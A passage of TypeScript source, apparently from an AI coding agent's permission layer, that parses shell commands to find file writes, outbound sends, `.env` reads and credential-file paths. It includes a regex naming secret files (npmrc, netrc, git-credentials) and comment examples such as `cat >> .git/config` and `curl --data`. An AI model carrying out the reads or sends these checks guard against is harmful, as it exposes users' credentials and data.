import { lstat, stat } from 'node:fs/promises';
import { homedir, tmpdir } from 'node:os';
import { basename, dirname, isAbsolute, join, parse, posix, sep, win32 } from 'node:path';
import type { Node } from 'web-tree-sitter';
import {
  PACKAGE_VALUE_OPTIONS,
  arityPrefix,
  commandTokens,
  directoryOptionValues,
  droppedOnlySafeOptions,
} from './bashArity';
import { parseBash } from './bashParser';
import { isEnvFile } from './envFiles';
import { own } from '@shared/ownKeys';
import { ghReadFiles, repositoryWrite, type RepositoryWrite } from './ownRepository';
import {
  PathAccessDenied,
  guardForm,
  guardFormWithin,
  onAnotherComputer,
  operandPlaces,
  operandTargets,
  realpathNearest,
  resolveWithinRootsPhysically,
  type OperandReader,
} from './paths';
import { inPlaceWrites } from './shellWrites';
import { wslLocation, wslUncPath, wslUserEnvironment } from '../../wsl/wslPath';

export interface ShellCommand {
  /** The command's tokens with options before the subcommand dropped: what a remembered pattern is matched against. */
  text: string;
  /** What "always allow" would remember for it, e.g. `git commit *`. */
  always: string;
  /**
   * False when the normalising dropped something that can change what runs - an env assignment
   * or an option off the safe list - so `text` no longer says what the command does.
   */
  coverable: boolean;
  /** The command as matched by rules, retaining assignments and redirects when it is not coverable. */
  words: string;
  /**
   * Set when the command runs code the scan cannot read (`eval`, `node -e`, `bash -c`, a script on
   * stdin): the leading words that name that form. A permission rule covers it only by naming them.
   */
  opaque?: string;
}

export interface ShellScan {
  commands: ShellCommand[];
  /** Physical paths named by the script, including paths inside shared roots and its starting folder. */
  paths?: string[];
  /** Folders a glob, an expanded operand or a recursive command reaches anything under, so a protected folder within or below one is reached. */
  globFolders?: string[];
  /** Folders a glob reaches below, but only through names that do not start with a dot (`ls *`). */
  dotlessGlobFolders?: string[];
  /** Directories the command reaches outside every granted root and the temp dirs. */
  directories: string[];
  /** Paths in a WSL distro no root is in, named without reading them: asked every time, never offered as a grant. */
  ungranted: string[];
  /** `.env` files named as an argument or an input redirect, which auto mode must not read unasked. */
  envFiles: string[];
  /** Why a command can send data off this computer, e.g. `curl --data`, which auto mode must not run unasked. */
  outbound: string[];
  /**
   * Each outbound command's reason, with the repository it writes to when its words pin one (see
   * `repositoryWrite`). Never set for a script that changes the environment, which can redirect git or gh.
   */
  sends: { reason: string; target: RepositoryWrite | null }[];
  /**
   * True when every command is one `containedCommand` accepts and nothing in the script sets the
   * environment, so no part of it can carry data to a host of the caller's choosing. A reply that
   * has read untrusted content still runs these unasked; see ChatService's DirectoryTurn.untrusted.
   */
  contained: boolean;
  /**
   * True when every command only reads: a contained program that writes nothing, or a git
   * subcommand that only reports (see `readOnlyGit`), with no redirect, in-place edit or
   * environment change. Lets a worktree session read its main checkout unasked.
   */
  readOnly: boolean;
  /** Files the script writes by redirect, `tee`, a copy or download destination, or in place (see shellWrites). */
  writes: string[];
  /** Folders whose contents the script may rewrite, such as an archive's extraction folder. */
  writtenTrees: string[];
}

const CHANGES_DIRECTORY = new Set(['cd', 'chdir', 'pushd', 'popd']);
const COPIES = new Set(['cp', 'mv', 'install', 'ln', 'rsync', 'scp']);
// The short flag may close a cluster (`-fsSLo`, `-qO`); curl's `-O` names no path, so case matters.
const DOWNLOAD_OUTPUT = new Map<string, { long: string; short: RegExp }>([
  ['curl', { long: '--output', short: /^-[a-zA-Z]*?o(.*)$/ }],
  ['wget', { long: '--output-document', short: /^-[a-zA-Z]*?O(.*)$/ }],
]);
const GIT_CONFIG_SETS =
  /^(set|unset|edit|-e|--edit|--add|--unset|--unset-all|--replace-all|--rename-section|--remove-section|rename-section|remove-section)$/;

/** Programs that only read what they are pointed at, when `containedCommand` also vouches for the call. */
const READ_PROBES = new Set(['ls', 'cat', 'head', 'tail', 'stat', 'file', 'wc', 'du', 'tree', 'find']);

/**
 * Where version managers and package managers install toolchains. An agent lists and reads these
 * to find which node or pnpm a project runs on; they hold binaries and package code, not secrets.
 * Deliberately narrow: `~/.local/share` as a whole also holds keyrings and app data.
 */
function toolchainLocations(home: string, joinIn: (...parts: string[]) => string): string[] {
  const system = [
    '/etc/profiles',
    '/nix/store',
    '/nix/var/nix/profiles',
    '/run/current-system/sw',
    '/opt/homebrew/bin',
    '/opt/homebrew/opt',
    '/opt/homebrew/Cellar',
    '/usr/local/bin',
    '/usr/local/lib/node_modules',
    '/usr/bin',
    '/bin',
  ];
  return [
    ...[
      '.nvm',
      '.volta',
      '.fnm',
      '.bun',
      '.deno',
      '.cargo/bin',
      '.rustup/toolchains',
      '.pyenv/versions',
      '.rbenv/versions',
      '.asdf/installs',
      '.asdf/shims',
      '.nix-profile',
      '.local/bin',
      '.local/share/pnpm',
      '.local/share/fnm',
      '.local/share/mise/installs',
      'Library/pnpm',
    ].map(path => joinIn(home, path)),
    ...system,
  ];
}

// Credential files a package manager or a shell keeps beside its toolchain.
const SECRET_NAME = /^\.?(npmrc|netrc|pypirc|git-credentials|yarnrc(\.yml)?)$|credential|secret|token/i;

const namesSecret = (path: string): boolean =>
  path.split(/[\\/]/).some(part => SECRET_NAME.test(part)) || isEnvFile(path);

/**
 * Whether a path outside the project is a toolchain install that a read-only probe may look at
 * unasked, both as written and with every symlink followed, so `~/.nvm/link -> ~/.ssh` still asks.
 * In a WSL folder the toolchains are the distro's, and `home` is the distro user's Linux home.
 */
export async function isToolchainPath(path: string, cwd: string, home: string = homedir()): Promise<boolean> {
  const wsl = wslLocation(cwd);
  const named = toolchainLocations(home, wsl ? posix.join : join);
  const locations = wsl ? named.map(location => wslUncPath(wsl, location)) : named;
  // Only the part below a toolchain root is checked: the root is trusted, and folders above it
  // (the home folder, a checkout path) may legitimately be named like a secret.
  const below = (candidate: string, roots: string[]): string => {
    const rest = roots
      .filter(root => candidate === root || candidate.startsWith(root.endsWith(sep) ? root : root + sep))
      .map(root => candidate.slice(root.length));
    return rest.length ? rest.reduce((a, b) => (a.length >= b.length ? a : b)) : candidate;
  };
  if (operandTargets(cwd, path).some(target => namesSecret(below(target, locations)))) return false;
  try {
    // Each root is resolved the way the path is: a root that does not exist under a linked
    // parent (macOS `/etc` -> `/private/etc`) must still match the path's physical form.
    const roots = await Promise.all(
      locations.map((root, index) => resolveWithinRootsPhysically(named[index] ?? root, [parse(root).root], root))
    );
    return !namesSecret(below(await resolveWithinRootsPhysically(path, roots, cwd), roots));
  } catch {
    return false;
  }
}

// Ported from opencode's shell tool, plus commands that write to a path or read one by name.
const TOUCHES_FILES = new Set([
  ...CHANGES_DIRECTORY,
  'rm',
  'cp',
  'mv',
  'mkdir',
  'touch',
  'chmod',
  'chown',
  'cat',
  'rmdir',
  'ln',
  'tee',
  'ls',
  'head',
  'tail',
  'less',
  'more',
  'wc',
  'file',
  'stat',
  'du',
  'find',
  'tree',
]);

const SUBSHELLS = new Set(['subshell', 'command_substitution', 'process_substitution']);

const HARMLESS_REDIRECT_TARGETS = new Set(['/dev/null', '/dev/stdin', '/dev/stdout', '/dev/stderr', '/dev/tty']);

const WRITE_OPERATORS = new Set(['>', '>>', '>|', '&>', '&>>', '>&']);

function redirectOperator(node: Node): string | undefined {
  return node.children.find(child => child && !child.isNamed)?.type;
}

/**
 * Whether a redirect writes a file. A write can plant config a remembered command then obeys -
 * `cat >> .git/config` before a `git status` - so it is never covered by a pattern.
 */
function writesFile(node: Node): boolean {
  if (node.type !== 'file_redirect' || !WRITE_OPERATORS.has(redirectOperator(node) ?? '')) return false;
  const target = node.childForFieldName('destination');
  if (!target || target.type === 'number') return false;
  const text = unquote(target.text);
  return !HARMLESS_REDIRECT_TARGETS.has(text) && !text.startsWith('&') && text !== '-';
}

/** A write can sit inside a heredoc redirect: `cat <<'EOF' >> .git/config` nests it one level down. */
function hasWriteRedirect(node: Node): boolean {
  return node.namedChildren.some(
    child =>
      child !== null &&
      (writesFile(child) ||
        (child.type === 'heredoc_redirect' &&
          child.descendantsOfType('file_redirect').some(n => n !== null && writesFile(n))))
  );
}

/**
 * Arithmetic assigns while the argument expands, before the command is looked up -
 * `git status $((PATH=0))` - and so does an indexed array subscript.
 */
const EVALUATES_ARITHMETIC = /\$\(\(|\$\[|\$\{[^}]*\[/;

/** Bash does not let a leading `*` or `?` match a dotfile, so `cat *` never reads `.env`. */
const ENV_FILE_SAMPLES = ['.env', '.env.local'];

function globMayMatchEnvFile(path: string): boolean {
  const name = basename(path);
  if (isEnvFile(name.replace(/\[[^\]]*\]|[?*]/g, ''))) return true;
  if (/^[?*[]/.test(name)) return false;
  const pattern = name
    .replace(/[.+^${}()|\\]/g, '\\$&')
    .replace(/\*/g, '.*')
    .replace(/\?/g, '.');
  try {
    const matcher = new RegExp(`^${pattern}$`);
    return ENV_FILE_SAMPLES.some(sample => matcher.test(sample));
  } catch {
    return true;
  }
}

export function unquote(text: string): string {
  if (text.length < 2) return text;
  const first = text[0];
  return (first === '"' || first === "'") && text.at(-1) === first ? text.slice(1, -1) : text;
}

/** A word as bash hands it to the program, with its quotes removed and its backslash escapes applied. */
function wordValue(word: string): string {
  let value = '';
  for (let at = 0; at < word.length; at++) {
    const char = word[at] as string;
    if (char === "'") {
      const end = word.indexOf("'", at + 1);
      value += word.slice(at + 1, end === -1 ? word.length : end);
      at = end === -1 ? word.length : end;
    } else if (char === '"') {
      for (at++; at < word.length && word[at] !== '"'; at++) {
        const next = word[at + 1];
        if (word[at] === '\\' && next !== undefined && '$`"\\\n'.includes(next)) {
          at++;
          if (next !== '\n') value += next;
        } else {
          value += word[at];
        }
      }
    } else if (char === '\\' && at + 1 < word.length) {
      at++;
      if (word[at] !== '\n') value += word[at];
    } else {
      value += char;
    }
  }
  return value;
}

/** `~` and `$HOME` are the user's home, which the shell expands before the program sees it. A Linux home is joined by Linux rules. */
export function expandHome(text: string, home: string = homedir()): string {
  const rules = home.startsWith('/') ? posix : { join, dirname };
  if (text === '~') return home;
  if (text.startsWith('~/')) return rules.join(home, text.slice(2));
  const named = /^~([^/]+)(\/.*)?$/.exec(text);
  if (named) return rules.join(rules.dirname(home), named[1], named[2] ?? '');
  const variable = /^\$(?:HOME|\{HOME\})(\/.*)?$/.exec(text);
  if (variable) return rules.join(home, variable[1] ?? '');
  return text;
}

function isDynamic(text: string): boolean {
  return text.includes('$') || text.includes('`');
}

/** Everything before the first glob character, or null when the argument opens with one. */
function globPrefix(text: string): string | null {
  const match = /[?*[]/.exec(text);
  if (!match) return text;
  return match.index === 0 ? null : text.slice(0, match.index);
}

/** One character of a word with its quotes removed, `active` when unquoted so a glob or brace in it is live; or an expansion. */
type WordPiece = { char: string; active: boolean } | { expansion: string };

/** The index just past the `close` that balances the run starting at `from`, skipping escapes and single quotes. */
function matchingEnd(word: string, from: number, open: string, close: string): number {
  let depth = 1;
  for (let at = from; at < word.length; at++) {
    const char = word[at];
    if (char === '\\') {
      at++;
    } else if (char === close) {
      if (--depth === 0) return at + 1;
    } else if (open !== '' && char === open) {
      depth++;
    } else if (char === "'" && close !== '"') {
      const end = word.indexOf("'", at + 1);
      at = end === -1 ? word.length : end;
    }
  }
  return word.length;
}

/** Where the `$` or backtick expansion at `at` ends; `at + 1` when the `$` is a literal one. */
function expansionEnd(word: string, at: number, quoted: boolean): number {
  const next = word[at + 1] ?? '';
  if (word[at] === '`') return matchingEnd(word, at + 1, '', '`');
  if (next === '(') return matchingEnd(word, at + 2, '(', ')');
  if (next === '{') return matchingEnd(word, at + 2, '{', '}');
  if (next === '[') return matchingEnd(word, at + 2, '[', ']');
  // `$'\x2e'` and `$"..."` are decoded or translated by bash, so they are read as expansions.
  if (!quoted && (next === "'" || next === '"')) return matchingEnd(word, at + 2, '', next);
  if (/[A-Za-z_]/.test(next)) {
    let end = at + 2;
    while (end < word.length && /\w/.test(word[end] as string)) end++;
    return end;
  }
  if (/[0-9@*#?$!-]/.test(next)) return at + 2;
  return at + 1;
}

/** A word's characters as bash reads them: quotes removed, backslash escapes applied, and each expansion kept whole. */
function wordPieces(word: string): WordPiece[] {
  const pieces: WordPiece[] = [];
  const push = (char: string, active: boolean): void => {
    pieces.push({ char, active });
  };
  const expansion = (at: number, quoted: boolean): number => {
    const end = expansionEnd(word, at, quoted);
    if (end === at + 1) push(word[at] as string, false);
    else pieces.push({ expansion: word.slice(at, end) });
    return end - 1;
  };
  for (let at = 0; at < word.length; at++) {
    const char = word[at] as string;
    if (char === '\\') {
      if (at + 1 >= word.length) push(char, false);
      else if (word[++at] !== '\n') push(word[at] as string, false);
    } else if (char === "'") {
      const end = word.indexOf("'", at + 1);
      const stop = end === -1 ? word.length : end;
      for (let quoted = at + 1; quoted < stop; quoted++) push(word[quoted] as string, false);
      at = stop;
    } else if (char === '"') {
      for (at++; at < word.length && word[at] !== '"'; at++) {
        const inner = word[at] as string;
        if (inner === '\\' && at + 1 < word.length && '$`"\\\n'.includes(word[at + 1] as string)) {
          if (word[++at] !== '\n') push(word[at] as string, false);
        } else if (inner === '$' || inner === '`') {
          at = expansion(at, true);
        } else {
          push(inner, false);
        }
      }
    } else if (char === '$' || char === '`') {
      at = expansion(at, false);
    } else {
      push(char, true);
    }
  }
  return pieces;
}

const isActive = (piece: WordPiece | undefined, char: string): boolean =>
  piece !== undefined && 'char' in piece && piece.active && piece.char === char;

/** More words than this from one brace expansion leave the operand unread. */
const BRACE_LIMIT = 64;

/** The words a `{a..e}` or `{1..9..2}` sequence makes, null when it is no sequence, or 'many' past the limit. */
function braceSequence(inner: readonly WordPiece[]): WordPiece[][] | null | 'many' {
  if (!inner.every(piece => 'char' in piece && piece.active)) return null;
  const text = inner.map(piece => ('char' in piece ? piece.char : '')).join('');
  const numeric = /^(-?\d+)\.\.(-?\d+)(?:\.\.(-?\d+))?$/.exec(text);
  const letters = /^([A-Za-z])\.\.([A-Za-z])(?:\.\.(-?\d+))?$/.exec(text);
  const match = numeric ?? letters;
  if (!match) return null;
  const [from, to] = numeric
    ? [Number(match[1]), Number(match[2])]
    : [(match[1] as string).charCodeAt(0), (match[2] as string).charCodeAt(0)];
  const step = Math.abs(Number(match[3] ?? 1)) || 1;
  const count = Math.floor(Math.abs(to - from) / step) + 1;
  if (count > BRACE_LIMIT) return 'many';
  const padded = numeric && (/^-?0\d/.test(match[1] as string) || /^-?0\d/.test(match[2] as string));
  const size = padded ? Math.max((match[1] as string).length, (match[2] as string).length) : 0;
  const words: WordPiece[][] = [];
  for (let index = 0; index < count; index++) {
    const value = from + (to >= from ? 1 : -1) * index * step;
    const text = numeric ? String(value).padStart(size, '0') : String.fromCharCode(value);
    words.push([...text].map(char => ({ char, active: false })));
  }
  return words;
}

/** Bash's brace expansion, which runs before every other: null when it makes more than BRACE_LIMIT words. */
function expandBraces(pieces: readonly WordPiece[]): WordPiece[][] | null {
  for (let open = 0; open < pieces.length; open++) {
    if (!isActive(pieces[open], '{')) continue;
    let depth = 0;
    let close = -1;
    const commas: number[] = [];
    for (let at = open; at < pieces.length && close === -1; at++) {
      if (isActive(pieces[at], '{')) depth++;
      else if (isActive(pieces[at], '}') && --depth === 0) close = at;
      else if (depth === 1 && isActive(pieces[at], ',')) commas.push(at);
    }
    if (close === -1) continue;
    const bounds = [open, ...commas, close];
    const options =
      commas.length > 0
        ? bounds.slice(1).map((end, index) => pieces.slice((bounds[index] as number) + 1, end))
        : braceSequence(pieces.slice(open + 1, close));
    if (options === null) continue;
    if (options === 'many') return null;
    const words: WordPiece[][] = [];
    for (const option of options) {
      const expanded = expandBraces([...pieces.slice(0, open), ...option, ...pieces.slice(close + 1)]);
      if (expanded === null) return null;
      words.push(...expanded);
      if (words.length > BRACE_LIMIT) return null;
    }
    return words;
  }
  return [[...pieces]];
}

/** Stands in for an expansion the scan cannot fill in. */
const EXPANSION_MARK = '\u0000';

/** One word as the program receives it, as far as the scan can tell. */
interface OperandWord {
  /** Known variables and `~` filled in, quotes removed, and each other expansion an EXPANSION_MARK. */
  text: string;
  /** Per character of `text`: an unquoted `*`, `?` or `[`. */
  glob: readonly boolean[];
  /** Where the first expansion the scan cannot fill in sits, or null. */
  expandAt: number | null;
}

/** What `~`, `$HOME`, `$PWD` and `$OLDPWD` stand for where the word is read. */
interface WordScope {
  home: string;
  cwd: string;
  previous: string;
  homeUsed(): void;
}

const KNOWN_VARIABLE = /^\$(?:\{(HOME|PWD|OLDPWD)\}|(HOME|PWD|OLDPWD))$/;

function resolveWord(pieces: readonly WordPiece[], scope: WordScope): OperandWord {
  let text = '';
  const glob: boolean[] = [];
  let expandAt: number | null = null;
  const literal = (value: string): void => {
    text += value;
    for (let index = 0; index < value.length; index++) glob.push(false);
  };
  const unknown = (): void => {
    expandAt ??= text.length;
    literal(EXPANSION_MARK);
  };
  let from = 0;
  if (isActive(pieces[0], '~')) {
    let name = '';
    let end = 1;
    for (; end < pieces.length && !isActive(pieces[end], '/'); end++) {
      const piece = pieces[end];
      if (!piece || !('char' in piece) || !piece.active) break;
      name += piece.char;
    }
    if (end === pieces.length || isActive(pieces[end], '/')) {
      from = end;
      const user = /^[A-Za-z_][\w.-]*$/.test(name);
      if (name === '' || user) scope.homeUsed();
      if (name === '') literal(scope.home);
      else if (name === '+') literal(scope.cwd);
      else if (name === '-') literal(scope.previous);
      else if (user) literal(expandHome(`~${name}`, scope.home));
      else unknown();
    }
  }
  for (const piece of pieces.slice(from)) {
    if ('char' in piece) {
      text += piece.char;
      glob.push(piece.active && '*?['.includes(piece.char));
      continue;
    }
    const known = KNOWN_VARIABLE.exec(piece.expansion);
    const variable = known?.[1] ?? known?.[2];
    if (variable === 'HOME') {
      scope.homeUsed();
      literal(scope.home);
    } else if (variable === 'PWD') {
      literal(scope.cwd);
    } else if (variable === 'OLDPWD') {
      literal(scope.previous);
    } else {
      unknown();
    }
  }
  return { text, glob, expandAt };
}

/** Every word one shell word becomes after brace expansion; null when there are too many to read. */
function operandWords(raw: string, scope: WordScope): OperandWord[] | null {
  return expandBraces(wordPieces(raw))?.map(pieces => resolveWord(pieces, scope)) ?? null;
}

/** A word already as the program sees it, as a Windows program's operand is: no quotes, and no expansion left. */
function literalWord(text: string): OperandWord {
  const expandAt = text.search(/[$`]/);
  return { text, glob: [...text].map(char => '*?['.includes(char)), expandAt: expandAt === -1 ? null : expandAt };
}

interface ReadOperand {
  /** The path the operand names, or for a glob or an expansion the folder it expands under. */
  path: string;
  /** Where the glob or expansion starts, or null when `path` is the whole operand. */
  start: number | null;
  /** A variable or command substitution decides the operand. */
  unread: boolean;
}

function readOperand(word: OperandWord, dirnameOf: (path: string) => string): ReadOperand {
  const globAt = word.glob.indexOf(true);
  const starts = [globAt === -1 ? null : globAt, word.expandAt].filter((at): at is number => at !== null);
  if (starts.length === 0) return { path: word.text, start: null, unread: false };
  const start = Math.min(...starts);
  // As compileRule does: a partial name is a match inside its folder, and `x/` names `x` itself.
  return { path: dirnameOf(`${word.text.slice(0, start)}x`), start, unread: word.expandAt !== null };
}

type GlobChar = { char: string; glob: boolean };

/**
 * Whether one glob component can match `name`, by bash's rules: a leading dot is matched only by a
 * literal one unless dotglob is on, which still never matches `.` or `..`. Case is ignored, which only asks more.
 */
function globMatches(pattern: readonly GlobChar[], name: string, dotGlob: boolean): boolean {
  const first = pattern[0];
  const literalDot = first !== undefined && !first.glob && first.char === '.';
  if (name.startsWith('.') && !literalDot && !(dotGlob && name !== '.' && name !== '..')) return false;
  const escape = (char: string): string => char.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
  let source = '';
  for (let at = 0; at < pattern.length; at++) {
    const { char, glob } = pattern[at] as GlobChar;
    if (!glob) {
      source += escape(char);
    } else if (char === '*') {
      source += '.*';
    } else if (char === '?') {
      source += '.';
    } else {
      let body = at + 1;
      const negated = pattern[body]?.char === '!' || pattern[body]?.char === '^';
      if (negated) body++;
      const close = pattern.findIndex((piece, index) => index > body && piece.char === ']');
      if (close === -1) {
        source += '\\[';
        continue;
      }
      const members = pattern
        .slice(body, close)
        .map(piece => piece.char)
        .join('');
      source += members.includes('[:') ? '.' : `[${negated ? '^' : ''}${members.replace(/[\\\]^[]/g, '\\$&')}]`;
      at = close;
    }
  }
  try {
    return new RegExp(`^${source}$`, 'is').test(name);
  } catch {
    return true;
  }
}

/** What a glob operand can reach beyond the folder it expands under. */
interface GlobShape {
  /** Its first component cannot match a name that starts with a dot. */
  dotless: boolean;
  /** Components that can walk up a folder (`..`, or `.?` in a bash without globskipdots). */
  up: number;
  /** A component can match `.claude`, the folder holding a project's permission settings. */
  namesSettings: boolean;
}

function globShape(word: OperandWord, start: number, dotGlob: boolean, separator: RegExp): GlobShape {
  let from = start;
  while (from > 0 && !separator.test(word.text[from - 1] as string)) from--;
  let current: GlobChar[] = [];
  const components: GlobChar[][] = [current];
  for (let at = from; at < word.text.length; at++) {
    const char = word.text[at] as string;
    if (separator.test(char)) {
      current = [];
      components.push(current);
    } else {
      current.push({ char, glob: word.glob[at] === true });
    }
  }
  const patterns = components.filter(component => component.some(piece => piece.glob));
  const up = components.filter(
    component =>
      component.map(piece => piece.char).join('') === '..' ||
      (component.some(piece => piece.glob) && globMatches(component, '..', dotGlob))
  ).length;
  const first = components[0]?.[0];
  return {
    dotless: up === 0 && !dotGlob && !(first !== undefined && !first.glob && first.char === '.'),
    up,
    namesSettings: patterns.some(pattern => globMatches(pattern, '.claude', dotGlob)),
  };
}

/** A script that may turn on dotglob, so a leading `*` can match a dotfile. */
const MAY_SET_DOTGLOB = /shopt|GLOBIGNORE|BASHOPTS|dotglob/;

type Reach = 'read' | 'write';

/** Programs that unpack an archive into a folder, so `inPlaceWrites` names their trees. */
const UNPACKS = new Set(['tar', 'bsdtar', 'unzip', '7z', '7za', '7zz', 'cpio']);

const shortFlags = (args: readonly string[]): string =>
  args
    .map(unquote)
    .filter(arg => /^-[A-Za-z]+$/.test(arg))
    .map(arg => arg.slice(1))
    .join('');

/**
 * The operands a command acts on as whole folders, by index into `args`, read (`grep -r`) or written (`rm -r`,
 * `mv`, a copy's destination, `find -delete`); `cwd` is the reach of a command that defaults to its folder.
 */
function treeOperands(program: string, args: readonly string[]): { operands: Map<number, Reach>; cwd: Reach | null } {
  const operands = new Map<number, Reach>();
  const flags = shortFlags(args);
  const longs = new Set(args.map(unquote).filter(arg => arg.startsWith('--')));
  const positional = args.flatMap((arg, index) => (unquote(arg).startsWith('-') ? [] : [index]));
  const mark = (indices: readonly number[], reach: Reach): void => {
    for (const index of indices) operands.set(index, reach);
  };
  // A copy writes its destination (the last operand, or `-t`'s value) and reads the rest.
  const copy = (): void => {
    const target = args.findIndex(arg => unquote(arg) === '-t' || unquote(arg).startsWith('--target-directory='));
    const destination =
      target === -1 ? positional.at(-1) : unquote(args[target] as string) === '-t' ? target + 1 : target;
    mark(positional, 'read');
    if (destination !== undefined) operands.set(destination, 'write');
  };
  // grep and rg take a pattern first unless `-e` or `-f` gives it.
  const searched = (): number[] =>
    args.some(arg => /^-[A-Za-z]*[ef]$|^--(regexp|file)(=|$)/.test(unquote(arg))) ? positional : positional.slice(1);
  switch (program) {
    case 'rm':
      if (/[rR]/.test(flags) || longs.has('--recursive')) mark(positional, 'write');
      break;
    case 'chmod':
    case 'chown':
    case 'chgrp':
      if (flags.includes('R') || longs.has('--recursive')) mark(positional.slice(1), 'write');
      break;
    case 'mv':
      mark(positional, 'write');
      break;
    case 'cp':
    case 'scp':
      if (/[rRa]/.test(flags) || longs.has('--recursive') || longs.has('--archive')) copy();
      break;
    case 'rsync':
      copy();
      break;
    case 'find': {
      const end = args.findIndex(arg => /^[-(!]/.test(unquote(arg)));
      const paths = positional.filter(index => end === -1 || index < end);
      if (!args.some(arg => (RUNS_A_PROGRAM.find as RegExp).test(unquote(arg)))) break;
      mark(paths, 'write');
      return { operands, cwd: paths.length === 0 ? 'write' : null };
    }
    case 'grep':
    case 'egrep':
    case 'fgrep':
    case 'rgrep':
    case 'rg': {
      const recursive =
        program === 'rg' ||
        program === 'rgrep' ||
        /[rR]/.test(flags) ||
        longs.has('--recursive') ||
        longs.has('--dereference-recursive');
      if (!recursive) break;
      const files = searched();
      mark(files, 'read');
      return { operands, cwd: files.length === 0 ? 'read' : null };
    }
    case 'tar':
    case 'bsdtar':
    case 'zip':
      mark(positional, 'read');
      break;
  }
  return { operands, cwd: null };
}

/** Options whose value is a folder or file, so an expansion there is an unread path. */
const PATH_OPTIONS = new Set(['-C', '-d', '--directory', '--target-directory']);
const PATH_OPTION_VALUE = /^(of|if|--directory|--target-directory)=/;

/** Programs whose first operand, or `-e`'s value, is a pattern or a script rather than a path. */
const PATTERN_FIRST: ReadonlyMap<string, { given: RegExp; values: RegExp }> = new Map([
  ...['grep', 'egrep', 'fgrep', 'rgrep', 'rg'].map(
    name => [name, { given: /^-[A-Za-z]*[ef]$|^--(regexp|file)(=|$)/, values: /^(-[A-Za-z]*e|--regexp)$/ }] as const
  ),
  ...['sed', 'gsed'].map(
    name =>
      [name, { given: /^-[A-Za-z]*[ef]$|^--(expression|file)(=|$)/, values: /^(-[A-Za-z]*e|--expression)$/ }] as const
  ),
  ...['awk', 'gawk', 'mawk', 'nawk'].map(
    name =>
      [
        name,
        { given: /^-[fE]$|^--(file|exec|source)(=|$)/, values: /^(-[eFv]|--source|--assign|--field-separator)$/ },
      ] as const
  ),
]);

/** Indices into `args` holding a pattern or script, which an expansion leaves no unread path in. */
function patternWords(program: string, args: readonly string[]): Set<number> {
  const shape = PATTERN_FIRST.get(program);
  const words = new Set<number>();
  if (!shape) return words;
  for (const [index, arg] of args.entries()) if (shape.values.test(unquote(arg))) words.add(index + 1);
  if (!args.some(arg => shape.given.test(unquote(arg)))) {
    const first = args.findIndex((arg, index) => !unquote(arg).startsWith('-') && !words.has(index));
    if (first !== -1) words.add(first);
  }
  return words;
}

/**
 * Whether a sed script runs a program or reads or writes a file of its own (`e`, `r`, `w`, `s///w`,
 * `s///e`). Anything it cannot parse counts too.
 */
export function sedScriptActs(script: string): boolean {
  let at = 0;
  const length = script.length;
  const blanks = (): void => {
    while (at < length && /[ \t]/.test(script[at] as string)) at++;
  };
  const until = (stops: RegExp): void => {
    while (at < length && !stops.test(script[at] as string)) at++;
  };
  // Past the closing delimiter of a regex or replacement; false when there is none.
  const delimited = (delimiter: string): boolean => {
    for (; at < length; at++) {
      if (script[at] === '\\') at++;
      else if (script[at] === delimiter) {
        at++;
        return true;
      }
    }
    return false;
  };
  const address = (): boolean => {
    const char = script[at];
    if (char !== undefined && /[\d$]/.test(char)) {
      while (at < length && /[\d$~]/.test(script[at] as string)) at++;
      return true;
    }
    if (char === '/' || char === '\\') {
      const delimiter = char === '/' ? '/' : script[at + 1];
      at += char === '/' ? 1 : 2;
      if (delimiter === undefined || !delimited(delimiter)) return false;
      while (at < length && /[IM]/.test(script[at] as string)) at++;
    }
    return true;
  };
  for (;;) {
    while (at < length && /[\s;]/.test(script[at] as string)) at++;
    if (at >= length) return false;
    if (script[at] === '#') {
      until(/\n/);
      continue;
    }
    if (script[at] === '}') {
      at++;
      continue;
    }
    if (!address()) return true;
    blanks();
    if (script[at] === ',') {
      at++;
      blanks();
      if (script[at] === '+' || script[at] === '~') {
        at++;
        while (at < length && /\d/.test(script[at] as string)) at++;
      } else if (!address()) {
        return true;
      }
    }
    blanks();
    while (script[at] === '!') {
      at++;
      blanks();
    }
    const command = script[at++];
    if (command === undefined) return true;
    if (command === '{') continue;
    if (':btTv'.includes(command)) {
      until(/[;\n]/);
      continue;
    }
    if ('aic'.includes(command)) {
      // Text to the end of the line, which a trailing backslash continues.
      do until(/\n/);
      while (script[at - 1] === '\\' && at++ < length);
      continue;
    }
    if (command === 's' || command === 'y') {
      const delimiter = script[at++];
      if (delimiter === undefined || delimiter === '\\' || delimiter === '\n') return true;
      if (!delimited(delimiter) || !delimited(delimiter)) return true;
      while (command === 's' && at < length && /[gpiImM\dew]/.test(script[at] as string)) {
        if (script[at] === 'e' || script[at] === 'w') return true;
        at++;
      }
    } else if ('lLqQ'.includes(command)) {
      blanks();
      while (at < length && /\d/.test(script[at] as string)) at++;
    } else if (!'=dDgGhHnNpPxzF'.includes(command)) {
      return true;
    }
    blanks();
    if (at < length && !/[;\n}#]/.test(script[at] as string)) return true;
  }
}

/** Whether an awk program writes, pipes or reads a file or runs a program of its own. */
export function awkProgramActs(program: string): boolean {
  return /\bsystem\s*\(|\|\s*&?\s*getline|\bgetline\b[^;{}\n]*<|\bprintf?\b[^;{}\n]*[>|]|@(include|load)\b/.test(
    program
  );
}

/** A word's value when the scan can read it whole, else null. */
function staticWord(raw: string): string | null {
  const pieces = wordPieces(raw);
  return pieces.every(piece => 'char' in piece)
    ? pieces.map(piece => ('char' in piece ? piece.char : '')).join('')
    : null;
}

/**
 * Whether a sed or awk call runs a script the scan cannot vouch for: one that writes, reads or runs
 * something itself, a script file, an expanded script, or `sed -s`.
 */
function runsOpaqueScript(program: string, args: readonly string[]): boolean {
  const sed = program === 'sed' || program === 'gsed';
  const awk = ['awk', 'gawk', 'mawk', 'nawk'].includes(program);
  if (!sed && !awk) return false;
  const scripts: string[] = [];
  let given = false;
  let positional = false;
  for (let index = 0; index < args.length; index++) {
    const arg = staticWord(args[index] as string);
    // Before the script is known, an expanded word may be it.
    if (arg === null) {
      if (!given) return true;
      continue;
    }
    const next = (): string | null => {
      const value = args[++index];
      return value === undefined ? null : staticWord(value);
    };
    if (arg === '--') {
      positional = true;
      continue;
    }
    if (!positional && arg.startsWith('--')) {
      const [name = '', value] = arg.slice(2).split(/=(.*)/s);
      if (sed && (name === 'file' || name === 'separate')) return true;
      if (awk && ['file', 'exec', 'load'].includes(name)) return true;
      if (awk && name === 'include' && (value ?? next()) !== 'inplace') return true;
      if ((sed && name === 'expression') || (awk && name === 'source')) {
        const script = value ?? next();
        if (script === null) return true;
        scripts.push(script);
        given = true;
      }
      continue;
    }
    if (!positional && arg.length > 1 && arg.startsWith('-')) {
